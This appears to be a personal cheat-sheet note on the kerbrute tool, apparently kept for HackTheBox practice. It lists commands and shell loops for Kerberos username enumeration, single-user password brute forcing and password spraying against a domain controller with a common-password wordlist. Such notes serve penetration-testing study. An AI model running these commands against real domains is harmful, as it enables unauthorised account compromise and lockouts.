---
tags:
---
# kerbrute

Bruteforce Kerberos: https://github.com/ropnop/kerbrute

## Capabilities

```bash
# Brute force valid usernames
./kerbrute userenum -d $domain --dc $ip users.txt -v

# Brute force passwords for a given user
./kerbrute bruteuser -d analysis.htb --dc $IP /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt jdoe
while IFS= read -r user; do ./kerbrute bruteuser -d $domain --dc $ip /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $user; done < users.txt

# Password spray for a given user list
./kerbrute passwordspray -d $domain --dc $ip users.txt 'Darkness1099!'
while IFS= read -r password; do ./kerbrute passwordspray -d $domain --dc $ip users.txt $password; done < passwords.txt
```

Use the following password list for bruteforcing in hackthebox:

```
/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt
```